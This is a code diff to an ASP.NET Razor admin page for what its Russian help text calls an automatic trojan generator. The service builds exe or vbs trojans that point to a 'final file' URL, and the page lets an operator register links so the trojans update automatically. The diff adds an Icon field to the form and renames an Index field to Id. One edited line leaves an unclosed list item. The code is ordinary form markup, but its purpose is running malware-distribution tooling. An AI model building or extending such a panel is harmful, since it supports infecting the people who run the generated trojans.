@@ -8,7 +8,7 @@
     <li>Параметры</li>
     <li>type - exe or vbs</li>
     <li>url - конечный файл</li>
-    <li>icon - Иконка [Under construction]</li>
+    <li>icon
     <li>Троян будет сгененирован автоматически при первом обращание</li>
     <li></li>
     Лучше добавить ссылки через форму ниже что бы система знала и обнавляла трояны автоматически
@@ -26,7 +26,7 @@
         {
             <div class="form-row d-flex align-items-center pack-row" style="gap: 10px;">
 
-                <input type="hidden" name="Items[@i].Index" value="@Model.Items[i].Index" class="form-control" placeholder="Index"/>
+                <input type="hidden" name="Items[@i].Id" value="@Model.Items[i].Id" class="form-control" placeholder="Index"/>
 
                 <label>Name</label>
                 <input type="text" name="Items[@i].Name" value="@Model.Items[i].Name" class="form-control" placeholder="Name"/>
@@ -36,6 +36,10 @@
                 <label>OriginalUrl</label>
                 <input type="text" name="Items[@i].OriginalUrl" value="@Model.Items[i].OriginalUrl" class="form-control" placeholder="OriginalUrl"/>
                 <span asp-validation-for="Items[@i].OriginalUrl" class="text-danger"></span>
+
+                <label>Icon</label>
+                <input type="text" name="Items[@i].Icon" value="@Model.Items[i].Icon" class="form-control" placeholder="Icon"/>
+                <span asp-validation-for="Items[@i].Icon" class="text-danger"></span>
                 
                 <label>Date</label>
                 <input type="text" name="Items[@i].Date" value="@Model.Items[i].Date" class="form-control" placeholder="Date"/>
@@ -87,9 +91,10 @@
         newRow.innerHTML = `
             <div class="d-flex align-items-center w-100" style="gap: 10px;">
                 <input type="checkbox" name="Items[${packIndex}].Enabled" value="true"/>
-                <input type="hidden" name="Items[${packIndex}].Index" class="form-control"/>
+                <input type="hidden" name="Items[${packIndex}].Id" class="form-control"/>
                 <input type="text" name="Items[${packIndex}].Name" class="form-control flex-grow-1" placeholder="Name" />
                 <input type="text" name="Items[${packIndex}].OriginalUrl" class="form-control flex-grow-1" placeholder="OriginalUrl" />
+                <input type="text" name="Items[${packIndex}].Icon" class="form-control flex-grow-1" placeholder="Icon" />
                 <button type="button" class="btn btn-danger btn-remove" onclick="removeRow(this)">Remove</button>
             </div>
         `;
